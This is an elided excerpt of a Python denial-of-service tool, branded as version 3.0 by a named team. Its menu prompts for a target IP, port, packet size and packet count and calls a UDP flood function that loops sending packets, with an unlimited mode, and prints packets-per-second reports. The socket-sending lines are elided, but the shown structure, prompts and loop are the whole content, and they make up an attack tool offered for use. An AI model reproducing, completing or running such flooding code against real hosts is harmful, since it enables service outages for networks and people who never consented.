...
\033[91m
 ...
 |_____/|_| |_|_| .__/ \___|_|
      v3.0      | |
                |_| by JRDP Team  https://github.com/jrdpteam
\033[0m
"""
...
def send_udp_flood_packet(target_ip, port, packet_size, num_packets):
    def send_packet():
        ...
        try:
            while num_packets == 0 or count < num_packets:
                ...
                if count % 1000 == 0:
                    ...
                    print(f"Sent {count} packets in {elapsed_time:.2f} seconds ({count / elapsed_time:.2f} packets/sec)")
        except KeyboardInterrupt:
            print(f"\nInterrupted! Sent a total of {count} packets.")
        finally:
            sock.close()
            elapsed_time = time.time() - start_time
            print(f"\nFinal report: Sent {count} packets in {elapsed_time:.2f} seconds ({count / elapsed_time:.2f} packets/sec)")
...
if __name__ == "__main__":
    ...
    if packet_type == 1:
        ...
        port = int(input("\033[95mEnter port: \033[0m"))
        packet_size = int(input("\033[95mEnter packet size: \033[0m"))
        send_udp_flood_packet(target_ip, port, packet_size, num_packets)
    elif packet_type == 8:
